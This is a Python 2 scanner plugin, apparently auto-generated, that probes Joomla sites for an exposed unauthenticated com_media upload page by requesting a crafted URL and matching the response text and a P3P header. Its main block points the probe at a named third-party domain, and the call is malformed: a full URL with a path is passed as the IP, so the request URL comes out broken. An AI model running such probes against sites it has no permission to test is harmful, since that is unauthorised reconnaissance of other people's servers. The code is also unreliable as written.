from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Refer https://cxsecurity.com/issue/WLB-2015110194


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder'
        url = arg + payload
        code, head, res, errcode, _ = curl.curl2(url)
        if code == 200 and 'Upload files' in res and 'P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"' in head:
            output(url,result,'hole')
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_8e580e80fe39d4225f60ec8c6cf0f9ef.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_8e580e80fe39d4225f60ec8c6cf0f9ef.py
#/root/github/poccreate/codesrc/exp-1671.py